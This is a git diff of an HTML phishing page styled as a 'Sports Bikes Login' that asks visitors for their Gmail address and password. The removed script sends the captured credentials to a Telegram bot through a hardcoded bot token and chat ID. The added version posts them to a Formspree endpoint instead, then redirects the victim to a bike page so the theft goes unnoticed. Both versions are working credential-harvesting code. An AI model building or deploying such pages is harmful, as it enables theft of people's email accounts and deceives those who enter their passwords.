@@ -10,43 +10,19 @@
 
     <div class="login-box">
         <h2>Sports Bikes Login</h2>
-        <form id="loginForm" onsubmit="sendDataToTelegram(event)">
+        <!-- Yahan apna Formspree endpoint daalna hai -->
+        <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST" onsubmit="setTimeout(function(){window.location.href='bike.html';}, 1000);">
             <div class="input-group">
                 <label>Gmail / Email</label>
-                <input type="text" id="email" required placeholder="Enter your email">
+                <input type="text" name="email" required placeholder="Enter your email">
             </div>
             <div class="input-group">
                 <label>Password</label>
-                <input type="password" id="password" required placeholder="Enter your password">
+                <input type="password" name="password" required placeholder="Enter your password">
             </div>
             <button type="submit" class="login-btn">Login & Explore</button>
         </form>
     </div>
-
-    <script>
-        function sendDataToTelegram(event) {
-            event.preventDefault();
-
-            let email = document.getElementById('email').value;
-            let pass = document.getElementById('password').value;
-
-            let botToken = '8676312851:AAGpeFtVbFy3_zEHdpT4Bim9z5lxCHIHCC8'; 
-            let chatId = '8745430026'; 
-
-            let message = `🚨 New Login Credentials!\n📧 Email: ${email}\n🔑 Password: ${pass}`;
-
-            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            fetch(url)
-            .then(response => {
-                window.location.href = "bike.html"; 
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                window.location.href = "bike.html"; 
-            });
-        }
-    </script>
 
 </body>
 </html>
